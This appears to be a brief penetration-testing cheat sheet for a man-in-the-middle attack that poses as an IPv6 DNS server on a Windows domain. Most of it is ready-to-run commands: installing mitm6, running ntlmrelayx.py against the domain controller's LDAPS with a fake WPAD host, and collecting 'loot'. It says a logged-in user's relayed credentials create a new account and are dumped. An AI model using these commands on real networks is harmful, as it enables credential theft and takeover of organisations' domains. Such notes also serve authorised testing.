## MITM attack by becoming IPv6 DNS

only use for 5-10 minutes
 
## Tools

mitm6
 
mitm6 github  
sudo pip2 install .
 
### ntlmrelayx.py -6 -t ldaps://<domain_IP> -wh fakewpad.<domain.local> -l loot
 
### another tab:

### sudo mitm6 -d <domain.local>
 
Loot will be placed in loot  
If a user logs in, a new user will be created for you and the creds will be outputed